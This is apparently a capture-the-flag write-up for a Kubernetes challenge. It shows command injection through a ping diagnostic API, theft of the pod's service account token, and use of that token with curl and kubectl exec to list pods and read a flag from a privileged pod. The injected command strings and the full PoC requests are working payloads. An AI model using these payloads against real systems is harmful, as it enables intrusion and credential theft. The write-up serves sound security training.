# Vulnerability

1. User input is executed by a shell, allowing remote command execution.
2. Excessive access for a service account attached to backend pod, so with extracted token from it, access to cluster can be established with connecting to API server directly. 

# Extraction

Now using token with excessive access from service account attached to backend pod, I can access the k8s API server and get the list of pods.

I got this list of pods using this command injected to ping service :

```
google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.96.0.1/api/v1/pods
```

and found pod `legacy-worker` and a flag in its response.

```
$ ping -c 2 google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.96.0.1/api/v1/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "914770"
  },
  "items": [
    {
      "metadata": {
        "name": "legacy-worker",
        "namespace": "escape-zone",
        "uid": "f4354bd1-27f5-41fc-b4b1-e76392a5be92",
        "resourceVersion": "772744",
        "creationTimestamp": "2026-08-19T15:27:58Z",
        "labels": {
          "app": "legacy-worker"
        },
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"labels\":{\"app\":\"legacy-worker\"},\"name\":\"legacy-worker\",\"namespace\":\"escape-zone\"},\"spec\":{\"automountServiceAccountToken\":false,\"containers\":[{\"command\":[\"sh\",\"-c\",\"sleep infinity\"],\"image\":\"ctf/escape-zone:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"legacy-worker\",\"resources\":{\"limits\":{\"cpu\":\"100m\",\"memory\":\"64Mi\"},\"requests\":{\"cpu\":\"50m\",\"memory\":\"32Mi\"}},\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\"}]}],\"initContainers\":[{\"command\":[\"sh\",\"-c\",\"mkdir -p /host/var/lib/node-data \\u0026\\u0026 echo \\\"FLAG\\\" \\u003e 
```

but I also found this in the response :
```
"initContainers": [
          {
            "name": "place-flag",
            "image": "ctf/escape-zone:latest",
            "command": [
              "sh",
              "-c",
              "mkdir -p /host/var/lib/node-data \u0026\u0026 echo \"FLAG\" \u003e /host/var/lib/node-data/flag.txt"
```

which is running a command to place the flag into a file in `legacy-woker` pod file system. So an alternative way to obtain this flag is to exec into this pod and cat the flag.txt which its full path is given above.

Using this command I entered legacy-worker and got shell to execute commands:
```
google.com; kubectl exec -n escape-zone legacy-worker --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://10.96.0.1 --insecure-skip-tls-verify -- cat /host/var/lib/node-data/flag.txt
```

* -n escape-zone : target namespace
* --token=... : authenticate using service account token instead of a normal kubeconfig
* --server=https://10.96.0.1 : point kubectl directly at the API server's internal address
* --insecure-skip-tls-verify : same reason as curl's -k
* -- cat /host/var/lib/node-data/flag.txt : the actual command to run inside the pod, after the -- separator

The backend service account has excessive RBAC permissions, including the ability to get the list of pods and execute commands in them. After discovering legacy-worker, the attacker can use `kubectl exec` to access the pod. Then inside the pod I can access its file system.

# PoC

```
curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{
    "host": "google.com; curl -sk -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://10.96.0.1/api/v1/pods"
  }' | grep -o "HAMAMOOZ"
```

and also :
```
curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{
    "host": "google.com; kubectl exec -n escape-zone legacy-worker --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://10.96.0.1 --insecure-skip-tls-verify -- cat /host/var/lib/node-data/flag.txt"
  }' | jq -r '.output'
```